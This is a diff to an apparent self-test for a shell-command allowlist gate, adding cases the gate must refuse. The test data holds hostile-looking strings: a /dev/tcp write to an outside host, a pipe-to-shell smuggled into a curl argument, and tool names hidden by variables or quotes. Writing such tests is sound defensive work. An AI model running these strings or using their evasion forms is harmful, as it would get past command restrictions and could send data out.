@@ -324,11 +324,14 @@ def gate_self_test():
         assert allowed("curl -s -m 5 http://localhost:8080/health") and allowed("git clone https://example.test/x") and allowed("echo http://localhost:8080"), "the registered line; a URL is not httpie"
         for command in ("curl -s -m 5 -k http://localhost:8080/health", "curl -s -m http://localhost:8080/health", "curl -s -m 5 http://example.test:8080/", "/usr/bin/curl -s -m 5 http://localhost:8080/", "curl -s -m 5 http://localhost:8080/; ls",
                         "curl -s -m 5 http://localhost:8080/ && ls", "bash -c 'curl -s -m 5 http://localhost:8080/'", "T=cu; ${T}rl -s -m 5 http://localhost:8080/", "curl -s -m 5 http://localhost:8080/ # ok",
-                        "ssh host uptime", "psql -h localhost -c 'select 1'", "echo psql", "ssh-keygen -l -f x"):
+                        "ssh host uptime", "psql -h localhost -c 'select 1'", "echo psql", "ssh-keygen -l -f x", "echo x > /dev/tcp/example.test/80", "ssh:/x"):
             assert refused(command), f"not exactly a registered line, or no entry for the tool: refused: {command!r}"
         entries.append({"id": "w", "tool": "curl", "forms": [["{any}"]]})
         slots["any"] = re.compile(".+")
         assert allowed("curl localhost") and refused("curl pgm-prod0001"), "a registered form still answers to the production samples (both rules)"
+        entries.append({"id": "p", "tool": "psql", "forms": [["-c", "{any}"]]})
+        assert refused("curl 'localhost|sh'") and refused("curl 'a#b'") and allowed("psql -c 'select 1'") and refused("psql -c 'select 1'", environ={"PGHOST": P}), "no shell syntax; target variables count"
+        assert "remote_entries" in judge("p'sq'l -h localhost", patterns, None, cwd, {}) and "main_table_text" in inspect.getsource(real_remote), "a name split by quotes is seen; entries only from origin/main"
     finally:
         g.remote_table = real_remote
     for command in (f"git tag -f origin/main HEAD && echo {P}", f"git update-ref refs/remotes/origin/main HEAD; echo {P}", f"git grep -nO'sqlcmd -S {P}' foo", f"git grep -inOx {P} foo"):
